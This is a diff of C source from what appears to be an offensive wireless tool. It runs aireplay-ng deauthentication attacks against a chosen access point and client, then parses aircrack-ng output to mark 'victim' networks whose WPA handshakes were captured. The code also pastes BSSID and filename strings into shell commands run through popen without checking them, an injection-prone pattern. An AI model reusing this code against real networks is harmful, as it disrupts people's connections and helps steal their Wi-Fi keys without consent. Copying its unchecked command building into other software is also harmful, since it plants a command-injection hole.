@@ -1,31 +1,29 @@
 #include "collection.h"
 
 extern char* wireless_device;
+extern WINDOW* data;
+extern step;
 
 void runDeauth(char* ap_bssid, char* client_bssid){
     char command[100] = ""; 
     sprintf(command, "aireplay-ng --deauth 10 -a %s -c %s %s", ap_bssid, client_bssid, wireless_device);
-    
-    printf("Attacking AP %s using client %s\n", ap_bssid, client_bssid);
-    int status = 0;
-    pid_t pid = fork();
-    if (pid == 0){
-        //hide output of scanning
-        int dev_null = open("/dev/null", O_WRONLY);
-        dup2(dev_null, 1);
-        dup2(dev_null, 2);
-        close(dev_null);
-
-        //run scanning TODO: check if not running sudo
-        execl("/bin/bash", "sh", "-c", command, NULL);
-        printf("error runnnig deauth\n");
-        kill(getppid(), SIGUSR1);
-        exit(1);
+        
+    FILE* commands = popen(command, "r");
+    size_t buffer_sz = 75;
+    char* buffer = (char*)malloc(buffer_sz);
+    int line_length = 0;
+    while( (line_length = getline(&buffer, &buffer_sz, commands)) != -1){
+        buffer[line_length-1] = '\0'; //strip new line
+        //wprintw(data, "Aireplay: %s\n", buffer);
+        if(strstr(buffer, "No such BSSID available.") != NULL){
+            wprintw(data, "ERROR: AP NOT FOUND BY AIRCRACK\n");
+            break;
+        }
     }
-    //wait for child to finish
-    wait(&status);
+    free(buffer);
+    pclose(commands);
 }
-void checkKey(AP* victim_APs, int num_victims, char* filename){
+bool checkKey(AP* victim_APs, int num_victims, char* filename){
     //APs that may have been attacked on this channel
     //aircrack command variables
     char command[100] = ""; 
@@ -33,19 +31,20 @@ void checkKey(AP* victim_APs, int num_victims, char* filename){
     int line_length = 0;
     size_t buffer_sz = 255*sizeof(char);
     char* buffer = malloc(buffer_sz);
+    bool captured = false;
 
     //run aircrack command and store output
     sprintf(command, "echo \"0\" | aircrack-ng %s 2> /dev/null", filename);
     commands = popen(command, "r");
-    printf("Checking for handshakes...\n");
+    step = STEP_HANDSHAKE_CHECKING;
     if(commands == NULL){
-        printf("ERROR RUNNING AIRCRACK-NG\n");
+        wprintw(data, "ERROR RUNNING AIRCRACK-NG\n");
         exit(1);
     }
     
     //Setup regular expression for BSSIDs
     regex_t isBSSID;
-    if(regcomp(&isBSSID, "[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}", REG_EXTENDED))
+    if(regcomp(&isBSSID, BSSID_REGEX, REG_EXTENDED))
         printf("compilation of regex failed!\n");
     
     //parse aircrack output to see which APs have handshakes captured
@@ -74,19 +73,19 @@ void checkKey(AP* victim_APs, int num_victims, char* filename){
             //if no handshakes found process next line
             if(num_handshakes == 0) continue;
             //if handshake found update AP entry to stop intrusive attacks
-            struct BSSID victim;
+            BSSID victim;
             PACK_BSSID(station_BSSID, &victim);
             //find AP with corresponding BSSID
             for(int i = 0; i < num_victims; i++){
-                if(memcmp(&victim_APs[i], &victim, sizeof(struct BSSID)) == 0){
+                if(memcmp(&victim_APs[i], &victim, sizeof(BSSID)) == 0){
+                    captured = true;
                     victim_APs[i].keyCaptured = true;
-                    printf("Successful handshake collected from %s\n", station_BSSID);
-                    break;
                 }
             }
         }
     }
-    
+    regfree(&isBSSID);
     free(buffer);
     pclose(commands);
+    return captured;
 }
